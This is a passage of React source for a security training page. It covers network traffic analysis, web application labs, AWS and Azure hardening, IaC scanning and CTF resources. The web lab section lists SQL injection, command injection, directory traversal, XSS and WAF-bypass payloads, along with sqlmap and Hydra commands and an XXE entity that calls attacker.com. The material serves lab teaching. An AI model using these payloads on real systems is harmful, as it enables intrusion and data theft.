tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.method -e http.request.uri > traffic.txt`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Traffic Analysis Exercises</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Baseline Analysis</strong>:
                      <ul className="list-disc pl-6">
                        <li>Capture normal network traffic</li>
                        <li>Identify common protocols and patterns</li>
                        <li>Create traffic profiles for different systems</li>
                      </ul>
                    </li>
                    <li><strong>Malicious Traffic Detection</strong>:
                      <ul className="list-disc pl-6">
                        <li>Analyze sample malware traffic (available online)</li>
                        <li>Identify C2 communication patterns</li>
                        <li>Detect data exfiltration attempts</li>
                        <li>Identify scanning and reconnaissance</li>
                      </ul>
                    </li>
                    <li><strong>Protocol Analysis</strong>:
                      <ul className="list-disc pl-6">
                        <li>Deep dive into HTTP/HTTPS traffic</li>
                        <li>Analyze DNS queries and responses</li>
                        <li>Examine encrypted vs. unencrypted traffic</li>
                      </ul>
                    </li>
                    <li><strong>Network Forensics</strong>:
                      <ul className="list-disc pl-6">
                        <li>Extract files from pcap files</li>
                        <li>Reconstruct sessions and conversations</li>
                        <li>Timeline analysis of network events</li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
              
              <h4 className="text-lg font-semibold mt-4">Sample Analysis Commands</h4>
              <CodeBlock language="bash">{`# Top talkers (most active IP addresses)
tshark -r capture.pcap -q -z conv,ip

# HTTP user agents
tshark -r capture.pcap -Y http.user_agent -T fields -e http.user_agent | sort | uniq -c | sort -nr

# DNS queries
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -nr

# Extract all HTTP objects
mkdir http_objects
tshark -r capture.pcap --export-objects http,./http_objects

# Find potential data exfiltration via DNS
tshark -r capture.pcap -Y "dns.qry.name.len > 50" -T fields -e dns.qry.name

# Detect potential port scanning
tshark -r capture.pcap -q -z endpoints,tcp | sort -k 5 -nr | head`}</CodeBlock>
            </div>
          </div>
        </TabsContent>

        {/* Web Security Tab */}
        <TabsContent value="webapp">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Web Application Security Labs</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Vulnerable Web Application Lab</h3>
                <p>
                  Set up multiple vulnerable web applications to practice testing and exploitation:
                </p>
                
                <h4 className="text-lg font-semibold">DVWA Setup</h4>
                <p>Damn Vulnerable Web Application is a PHP/MySQL web application with intentional vulnerabilities:</p>
                <CodeBlock language="bash">{`# Using Docker (recommended)
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Manual setup
git clone https://github.com/digininja/DVWA.git
cd DVWA
# Configure database in config/config.inc.php
# Set up with a web server (Apache/Nginx) and PHP`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">OWASP Juice Shop Setup</h4>
                <p>A modern vulnerable web application built with Node.js:</p>
                <CodeBlock language="bash">{`# Using Docker
docker run --rm -it -p 3000:3000 bkimminich/juice-shop

# Using Node.js
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Additional Vulnerable Applications</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>WebGoat</strong> - Java-based training environment</li>
                  <li><strong>OWASP Mutillidae II</strong> - PHP-based vulnerable app</li>
                  <li><strong>bWAPP</strong> - Buggy Web Application</li>
                  <li><strong>Vulnhub</strong> - Various vulnerable VMs with web apps</li>
                </ul>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Web Security Testing Tools</h3>
                <p>
                  Configure essential tools for web application security testing:
                </p>
                
                <h4 className="text-lg font-semibold">Burp Suite Setup</h4>
                <ol className="list-decimal pl-6 space-y-2">
                  <li>Download Burp Suite Community Edition from <a href="https://portswigger.net/burp/communitydownload" className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">PortSwigger</a></li>
                  <li>Configure your browser to use Burp as a proxy (typically 127.0.0.1:8080)</li>
                  <li>Install the Burp CA certificate in your browser</li>
                  <li>Configure scope to include only your lab applications</li>
                </ol>
                
                <h4 className="text-lg font-semibold mt-4">OWASP ZAP Setup</h4>
                <p>ZAP is a free alternative to Burp Suite with powerful features:</p>
                <CodeBlock language="bash">{`# Install ZAP on Ubuntu
sudo apt update
sudo apt install -y zaproxy

# Or download from https://www.zaproxy.org/download/

# Run ZAP and configure browser proxy settings
# Configure scope to include only your lab applications`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Additional Web Testing Tools</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Nikto</strong> - Web server scanner</li>
                  <li><strong>SQLmap</strong> - Automated SQL injection tool</li>
                  <li><strong>Dirsearch/Gobuster</strong> - Directory brute forcing</li>
                  <li><strong>JWT_Tool</strong> - JWT testing</li>
                  <li><strong>XSS Hunter</strong> - XSS detection and exploitation</li>
                </ul>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">OWASP Top 10 Lab Exercises</h3>
              <p>
                Practice identifying and exploiting the OWASP Top 10 vulnerabilities:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">1. Injection Attacks</h4>
                  <p><strong>SQL Injection Lab:</strong></p>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Access DVWA and set security level to low</li>
                    <li>Navigate to the SQL Injection page</li>
                    <li>Practice manual SQL injection:
                      <CodeBlock language="sql">{`' OR 1=1 --
' UNION SELECT user,password FROM users --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`}</CodeBlock>
                    </li>
                    <li>Use SQLmap for automated testing:
                      <CodeBlock language="bash">{`sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --dbs
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -D dvwa --tables
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -D dvwa -T users --dump`}</CodeBlock>
                    </li>
                  </ol>
                  
                  <p className="mt-4"><strong>Command Injection Lab:</strong></p>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Navigate to the Command Injection page in DVWA</li>
                    <li>Practice command injection payloads:
                      <CodeBlock language="bash">{`127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 ; ls -la`}</CodeBlock>
                    </li>
                  </ol>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">2. Broken Authentication</h4>
                  <p><strong>Authentication Bypass Lab:</strong></p>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Identify login forms in your vulnerable applications</li>
                    <li>Test for common authentication flaws:
                      <ul className="list-disc pl-6">
                        <li>Default credentials (admin/admin, admin/password)</li>
                        <li>Brute force with Hydra:
                          <CodeBlock language="bash">{`hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}</CodeBlock>
                        </li>
                        <li>Test for SQL injection in login forms:
                          <CodeBlock language="sql">{`admin' --
admin' OR 1=1 --`}</CodeBlock>
                        </li>
                        <li>Test for remember-me functionality vulnerabilities</li>
                        <li>Check for weak password reset mechanisms</li>
                      </ul>
                    </li>
                  </ol>
                  
                  <h4 className="text-lg font-semibold mt-4">3. Sensitive Data Exposure</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Use Burp/ZAP to intercept traffic and check for:
                      <ul className="list-disc pl-6">
                        <li>Unencrypted data transmission</li>
                        <li>Sensitive data in HTTP responses</li>
                        <li>Insecure cookie attributes (missing HttpOnly, Secure)</li>
                      </ul>
                    </li>
                    <li>Check for directory traversal vulnerabilities:
                      <CodeBlock language="bash">{`../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd`}</CodeBlock>
                    </li>
                    <li>Search for exposed configuration files and backups:
                      <CodeBlock language="bash">{`gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x .bak,.config,.old,.backup`}</CodeBlock>
                    </li>
                  </ol>
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
                <div>
                  <h4 className="text-lg font-semibold">4. XML External Entities (XXE)</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Identify XML input points in applications</li>
                    <li>Test for XXE vulnerabilities:
                      <CodeBlock language="xml">{`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`}</CodeBlock>
                    </li>
                    <li>Test for blind XXE using out-of-band techniques:
                      <CodeBlock language="xml">{`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd" >
%xxe;
]>
<foo>Triggered</foo>`}</CodeBlock>
                    </li>
                  </ol>
                  
                  <h4 className="text-lg font-semibold mt-4">5. Broken Access Control</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Test for horizontal privilege escalation:
                      <ul className="list-disc pl-6">
                        <li>Modify user IDs in requests</li>
                        <li>Access resources of other users</li>
                      </ul>
                    </li>
                    <li>Test for vertical privilege escalation:
                      <ul className="list-disc pl-6">
                        <li>Access admin functions as a regular user</li>
                        <li>Modify request parameters to elevate privileges</li>
                      </ul>
                    </li>
                    <li>Test for insecure direct object references:
                      <CodeBlock language="bash">{`# Original request
GET /app/account/123

# Modified request
GET /app/account/124`}</CodeBlock>
                    </li>
                  </ol>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">6. Cross-Site Scripting (XSS)</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Identify input fields and test for XSS:
                      <CodeBlock language="html">{`<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg/onload=alert('XSS')>
javascript:alert('XSS')`}</CodeBlock>
                    </li>
                    <li>Test for different XSS types:
                      <ul className="list-disc pl-6">
                        <li>Reflected XSS (input is reflected in the response)</li>
                        <li>Stored XSS (input is stored and displayed later)</li>
                        <li>DOM-based XSS (vulnerability in client-side JavaScript)</li>
                      </ul>
                    </li>
                    <li>Practice XSS exploitation:
                      <ul className="list-disc pl-6">
                        <li>Cookie stealing</li>
                        <li>Keylogging</li>
                        <li>Phishing</li>
                      </ul>
                    </li>
                  </ol>
                  
                  <h4 className="text-lg font-semibold mt-4">7. Security Misconfiguration</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Check for default credentials on applications</li>
                    <li>Look for unnecessary features enabled</li>
                    <li>Test for directory listing:
                      <CodeBlock language="bash">{`dirb http://localhost/`}</CodeBlock>
                    </li>
                    <li>Check for information disclosure in error messages</li>
                    <li>Scan for outdated software and components:
                      <CodeBlock language="bash">{`nikto -h http://localhost/`}</CodeBlock>
                    </li>
                  </ol>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Web Application Firewall (WAF) Lab</h3>
              <p>
                Set up and test a WAF to understand both protection and bypass techniques:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">ModSecurity Setup</h4>
                  <p>Configure ModSecurity with OWASP Core Rule Set (CRS):</p>
                  <CodeBlock language="bash">{`# Install ModSecurity with Apache
sudo apt update
sudo apt install -y libapache2-mod-security2

# Enable ModSecurity
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# Set ModSecurity to detection mode
sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf

# Install OWASP CRS
cd /etc/modsecurity
sudo git clone https://github.com/coreruleset/coreruleset.git
cd coreruleset
sudo cp crs-setup.conf.example crs-setup.conf

# Configure Apache to use CRS
sudo nano /etc/apache2/mods-enabled/security2.conf
# Add: Include /etc/modsecurity/coreruleset/crs-setup.conf
# Add: Include /etc/modsecurity/coreruleset/rules/*.conf

# Restart Apache
sudo systemctl restart apache2`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">WAF Testing and Bypass Techniques</h4>
                  <p>Practice both testing WAF effectiveness and bypass techniques:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Test WAF Detection</strong>:
                      <ul className="list-disc pl-6">
                        <li>Send known attack payloads</li>
                        <li>Verify WAF blocks and logging</li>
                        <li>Test coverage of OWASP Top 10</li>
                      </ul>
                    </li>
                    <li><strong>WAF Bypass Techniques</strong>:
                      <ul className="list-disc pl-6">
                        <li>Encoding variations:
                          <CodeBlock language="bash">{`# URL encoding
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Double encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Unicode encoding
\u003Cscript\u003Ealert(1)\u003C/script\u003E`}</CodeBlock>
                        </li>
                        <li>Case manipulation:
                          <CodeBlock language="html">{`<ScRiPt>alert(1)</sCrIpT>`}</CodeBlock>
                        </li>
                        <li>Fragmentation and obfuscation:
                          <CodeBlock language="html">{`<img src="x" o
nerror="alert(1)">`}</CodeBlock>
                        </li>
                      </ul>
                    </li>
                  </ul>
                  
                  <Alert className="mt-4">
                    <ShieldAlert className="h-4 w-4" />
                    <AlertTitle>WAF Limitations</AlertTitle>
                    <AlertDescription>
                      WAFs are an important security layer but should never be the only defense.
                      Always implement secure coding practices and multiple layers of security.
                    </AlertDescription>
                  </Alert>
                </div>
              </div>
            </div>
          </div>
        </TabsContent>

        {/* Cloud Labs Tab */}
        <TabsContent value="cloud">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Cloud Security Labs</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">AWS Security Lab</h3>
                <p>
                  Set up a secure AWS environment to practice cloud security concepts:
                </p>
                
                <h4 className="text-lg font-semibold">AWS Lab Setup</h4>
                <ol className="list-decimal pl-6 space-y-2">
                  <li>Create an AWS Free Tier account</li>
                  <li>Set up multi-factor authentication (MFA) for the root account</li>
                  <li>Create an IAM user with administrative permissions</li>
                  <li>Configure AWS CLI with your credentials:
                    <CodeBlock language="bash">{`aws configure
# Enter your Access Key ID and Secret Access Key
# Set default region and output format`}</CodeBlock>
                  </li>
                  <li>Create a basic VPC with public and private subnets:
                    <CodeBlock language="bash">{`# Create a VPC
aws ec2 create-vpc --cidr-block 10.0.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=SecurityLab}]'

# Create subnets
aws ec2 create-subnet --vpc-id vpc-id --cidr-block 10.0.1.0/24 --availability-zone us-east-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=PublicSubnet}]'
aws ec2 create-subnet --vpc-id vpc-id --cidr-block 10.0.2.0/24 --availability-zone us-east-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=PrivateSubnet}]'

# Create and attach internet gateway
aws ec2 create-internet-gateway --tag-specifications 'ResourceType=internet-gateway,Tags=[{Key=Name,Value=SecurityLabIGW}]'
aws ec2 attach-internet-gateway --vpc-id vpc-id --internet-gateway-id igw-id`}</CodeBlock>
                  </li>
                </ol>
                
                <h4 className="text-lg font-semibold mt-4">AWS Security Best Practices Lab</h4>
                <p>Practice implementing AWS security best practices:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>IAM Security</strong>:
                    <ul className="list-disc pl-6">
                      <li>Create IAM users, groups, and roles with least privilege</li>
                      <li>Implement IAM policies</li>
                      <li>Set up cross-account access</li>
                      <li>Configure IAM Access Analyzer</li>
                    </ul>
                  </li>
                  <li><strong>S3 Security</strong>:
                    <CodeBlock language="bash">{`# Create a secure S3 bucket
aws s3api create-bucket --bucket secure-bucket-name --region us-east-1

# Enable S3 Block Public Access
aws s3api put-public-access-block --bucket secure-bucket-name --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enable S3 bucket encryption
aws s3api put-bucket-encryption --bucket secure-bucket-name --server-side-encryption-configuration '{"Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "AES256"}}]}'

# Enable S3 versioning
aws s3api put-bucket-versioning --bucket secure-bucket-name --versioning-configuration Status=Enabled`}</CodeBlock>
                  </li>
                </ul>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Azure Security Lab</h3>
                <p>
                  Set up a secure Azure environment to practice cloud security concepts:
                </p>
                
                <h4 className="text-lg font-semibold">Azure Lab Setup</h4>
                <ol className="list-decimal pl-6 space-y-2">
                  <li>Create an Azure Free Account</li>
                  <li>Set up multi-factor authentication</li>
                  <li>Install Azure CLI:
                    <CodeBlock language="bash">{`# Install Azure CLI on Ubuntu
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login to Azure
az login`}</CodeBlock>
                  </li>
                  <li>Create a resource group for your lab:
                    <CodeBlock language="bash">{`az group create --name SecurityLab --location eastus`}</CodeBlock>
                  </li>
                  <li>Create a virtual network with subnets:
                    <CodeBlock language="bash">{`az network vnet create --resource-group SecurityLab --name SecurityVNet --address-prefix 10.0.0.0/16 --subnet-name PublicSubnet --subnet-prefix 10.0.1.0/24

az network vnet subnet create --resource-group SecurityLab --vnet-name SecurityVNet --name PrivateSubnet --address-prefix 10.0.2.0/24`}</CodeBlock>
                  </li>
                </ol>
                
                <h4 className="text-lg font-semibold mt-4">Azure Security Best Practices Lab</h4>
                <p>Practice implementing Azure security best practices:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Azure AD Security</strong>:
                    <ul className="list-disc pl-6">
                      <li>Configure Conditional Access policies</li>
                      <li>Implement Privileged Identity Management (PIM)</li>
                      <li>Set up Azure AD Identity Protection</li>
                    </ul>
                  </li>
                  <li><strong>Azure Network Security</strong>:
                    <CodeBlock language="bash">{`# Create a Network Security Group
az network nsg create --resource-group SecurityLab --name SecureNSG

# Add security rules
az network nsg rule create --resource-group SecurityLab --nsg-name SecureNSG --name AllowSSH --priority 100 --source-address-prefixes '*' --source-port-ranges '*' --destination-address-prefixes '*' --destination-port-ranges 22 --access Allow --protocol Tcp --description "Allow SSH"

# Associate NSG with subnet
az network vnet subnet update --resource-group SecurityLab --vnet-name SecurityVNet --name PublicSubnet --network-security-group SecureNSG`}</CodeBlock>
                  </li>
                  <li><strong>Azure Key Vault</strong>:
                    <CodeBlock language="bash">{`# Create a Key Vault
az keyvault create --resource-group SecurityLab --name SecureKeyVault --location eastus

# Add a secret to Key Vault
az keyvault secret set --vault-name SecureKeyVault --name ExamplePassword --value "SecureP@ssw0rd"

# Configure access policy
az keyvault set-policy --resource-group SecurityLab --name SecureKeyVault --upn user@example.com --secret-permissions get list set delete`}</CodeBlock>
                  </li>
                </ul>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Cloud Security Monitoring Lab</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">AWS CloudTrail and GuardDuty</h4>
                  <p>Set up monitoring and detection services in AWS:</p>
                  <CodeBlock language="bash">{`# Enable CloudTrail
aws cloudtrail create-trail --name SecurityLabTrail --s3-bucket-name cloudtrail-logs-bucket --is-multi-region-trail --enable-log-file-validation

# Start logging
aws cloudtrail start-logging --name SecurityLabTrail

# Enable GuardDuty
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES

# Create CloudWatch alarms for specific events
aws cloudwatch put-metric-alarm --alarm-name RootAccountUsage --metric-name RootAccountUsage --namespace CloudTrailMetrics --statistic Sum --period 300 --threshold 1 --comparison-operator GreaterThanOrEqualToThreshold --evaluation-periods 1 --alarm-actions arn:aws:sns:us-east-1:account-id:security-alerts`}</CodeBlock>
                  
                  <h4 className="text-lg font-semibold mt-4">AWS Security Hub</h4>
                  <p>Enable and configure AWS Security Hub:</p>
                  <CodeBlock language="bash">{`# Enable Security Hub
aws securityhub enable-security-hub

# Enable security standards
aws securityhub batch-enable-standards --standards-subscription-requests '[{"StandardsArn":"arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"}]'

# Get findings
aws securityhub get-findings --filter '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Azure Security Center and Sentinel</h4>
                  <p>Set up monitoring and detection services in Azure:</p>
                  <CodeBlock language="bash">{`# Enable Azure Security Center
az security auto-provisioning-setting update --name default --auto-provision On

# Enable Azure Defender
az security pricing update --name VirtualMachines --tier Standard

# Configure Azure Activity Log
az monitor log-profiles create --name default --location global --locations global --categories Delete Write Action --retention-days 365 --storage-account-id /subscriptions/subscription-id/resourceGroups/SecurityLab/providers/Microsoft.Storage/storageAccounts/securitylogs

# Set up Azure Sentinel (via portal)
# 1. Create a Log Analytics workspace
# 2. Add Sentinel to the workspace
# 3. Connect data sources
# 4. Create detection rules`}</CodeBlock>
                  
                  <h4 className="text-lg font-semibold mt-4">Cloud Security Monitoring Exercises</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Generate Security Events</strong>:
                      <ul className="list-disc pl-6">
                        <li>Create unauthorized access attempts</li>
                        <li>Modify security groups/NSGs</li>
                        <li>Create public resources</li>
                        <li>Simulate suspicious API calls</li>
                      </ul>
                    </li>
                    <li><strong>Create Custom Detection Rules</strong>:
                      <ul className="list-disc pl-6">
                        <li>Develop CloudWatch/Azure Monitor alerts</li>
                        <li>Create SIEM detection rules</li>
                        <li>Set up automated responses</li>
                      </ul>
                    </li>
                    <li><strong>Incident Response</strong>:
                      <ul className="list-disc pl-6">
                        <li>Document incident response procedures</li>
                        <li>Practice containment in cloud environments</li>
                        <li>Test remediation playbooks</li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Cloud Infrastructure as Code Security</h3>
              <p>
                Practice securing infrastructure as code deployments:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">AWS CloudFormation Security</h4>
                  <p>Create and secure CloudFormation templates:</p>
                  <CodeBlock language="yaml">{`AWSTemplateFormatVersion: '2010-09-09'
Description: 'Secure VPC with private and public subnets'

Resources:
  # Create a VPC
  VPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: 10.0.0.0/16
      EnableDnsSupport: true
      EnableDnsHostnames: true
      Tags:
        - Key: Name
          Value: SecureVPC

  # Create a private subnet
  PrivateSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref VPC
      CidrBlock: 10.0.1.0/24
      AvailabilityZone: !Select [0, !GetAZs '']
      Tags:
        - Key: Name
          Value: PrivateSubnet

  # Create a security group with restricted access
  SecureSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Secure SG with minimal access
      VpcId: !Ref VPC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22
          CidrIp: 10.0.0.0/24  # Restrict SSH to specific IP range
      SecurityGroupEgress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0  # Allow HTTPS outbound only

  # S3 bucket with encryption and versioning
  SecureS3Bucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: AES256
      VersioningConfiguration:
        Status: Enabled
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Terraform Security</h4>
                  <p>Create and secure Terraform configurations:</p>
                  <CodeBlock language="hcl">{`provider "aws" {
  region = "us-east-1"
}

# Create a VPC with secure configuration
resource "aws_vpc" "secure_vpc" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
  
  tags = {
    Name = "SecureVPC"
  }
}

# Create a private subnet
resource "aws_subnet" "private_subnet" {
  vpc_id            = aws_vpc.secure_vpc.id
  cidr_block        = "10.0.1.0/24"
  availability_zone = "us-east-1a"
  
  tags = {
    Name = "PrivateSubnet"
  }
}

# Create a security group with restricted access
resource "aws_security_group" "secure_sg" {
  name        = "secure-sg"
  description = "Secure SG with minimal access"
  vpc_id      = aws_vpc.secure_vpc.id
  
  # Restrict SSH to specific IP range
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/24"]
  }
  
  # Allow HTTPS outbound only
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# S3 bucket with encryption and versioning
resource "aws_s3_bucket" "secure_bucket" {
  bucket = "secure-terraform-bucket"
  
  versioning {
    enabled = true
  }
  
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }
}

# Block public access
resource "aws_s3_bucket_public_access_block" "secure_bucket_access" {
  bucket = aws_s3_bucket.secure_bucket.id
  
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}`}</CodeBlock>
                </div>
              </div>
              
              <h4 className="text-lg font-semibold mt-4">IaC Security Scanning</h4>
              <p>Set up and use tools to scan infrastructure as code for security issues:</p>
              <CodeBlock language="bash">{`# Install and use cfn-nag for CloudFormation
gem install cfn-nag
cfn-nag-scan --input-path template.yaml

# Install and use checkov for Terraform, CloudFormation, etc.
pip install checkov
checkov -f main.tf

# Install and use tfsec for Terraform
# For Linux/macOS
brew install tfsec  # or
curl -s https://raw.githubusercontent.com/aquasecurity/tfsec/master/scripts/install_linux.sh | bash
# Scan Terraform files
tfsec .

# Use AWS CloudFormation Guard
pip install cloudformation-guard
cfn-guard validate -r rules.guard -d template.yaml`}</CodeBlock>
              
              <Alert className="mt-4">
                <ShieldAlert className="h-4 w-4" />
                <AlertTitle>IaC Security Best Practices</AlertTitle>
                <AlertDescription>
                  Always integrate IaC security scanning into your CI/CD pipeline to catch security issues early.
                  Implement policy as code to enforce security standards consistently across all deployments.
                </AlertDescription>
              </Alert>
            </div>
          </div>
        </TabsContent>

        {/* CTF & Competitions Tab */}
        <TabsContent value="ctf">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">CTF & Security Competitions</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Capture The Flag (CTF) Basics</h3>
                <p>
                  CTFs are competitions that test your security skills through challenges:
                </p>
                
                <h4 className="text-lg font-semibold">Types of CTFs</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Jeopardy-style</strong> - Categories of challenges with point values</li>
                  <li><strong>Attack-Defense</strong> - Teams defend their systems while attacking others</li>
                  <li><strong>King of the Hill</strong> - Compete to control a vulnerable system</li>
                  <li><strong>Hardware CTFs</strong> - Focus on hardware and embedded systems</li>
                </ul>
                
                <h4 className="text-lg font-semibold mt-4">Common CTF Categories</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Web Exploitation</strong> - Web vulnerabilities and attacks</li>
                  <li><strong>Cryptography</strong> - Breaking or implementing crypto</li>
                  <li><strong>Reverse Engineering</strong> - Analyzing compiled programs</li>
                  <li><strong>Binary Exploitation</strong> - Buffer overflows, ROP chains, etc.</li>
                  <li><strong>Forensics</strong> - Analyzing disk images, memory dumps, etc.</li>
                  <li><strong>OSINT</strong> - Open-source intelligence gathering</li>
                  <li><strong>Steganography</strong> - Finding hidden data in files</li>
                </ul>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">CTF Platforms and Resources</h3>
                <p>
                  Practice with these platforms to build your CTF skills:
                </p>
                
                <h4 className="text-lg font-semibold">Online CTF Platforms</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>CTFtime</strong> - Calendar of upcoming CTFs and team rankings</li>
                  <li><strong>HackTheBox</strong> - Penetration testing labs and challenges</li>
                  <li><strong>TryHackMe</strong> - Guided learning paths and rooms</li>
                  <li><strong>PicoCTF</strong> - Educational CTF for beginners</li>
                  <li><strong>VulnHub</strong> - Vulnerable VMs for practice</li>
                  <li><strong>OverTheWire</strong> - Wargames for different skill levels</li>
                  <li><strong>RootMe</strong> - Challenges covering various security topics</li>
                </ul>
                
                <h4 className="text-lg font-semibold mt-4">CTF Tools</h4>
                <p>Essential tools for different CTF categories:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Web</strong>: Burp Suite, OWASP ZAP, Dirsearch</li>
                  <li><strong>Crypto</strong>: CyberChef, RsaCtfTool, HashCat</li>
                  <li><strong>Reverse Engineering</strong>: Ghidra, IDA Pro, Radare2</li>
                  <li><strong>Binary Exploitation</strong>: GDB, Pwntools, ROPgadget</li>
                  <li><strong>Forensics</strong>: Volatility, Autopsy, Wireshark</li>
                  <li><strong>Steganography</strong>: StegSolve, ExifTool, Binwalk</li>
                </ul>
                
                <Alert className="mt-4">
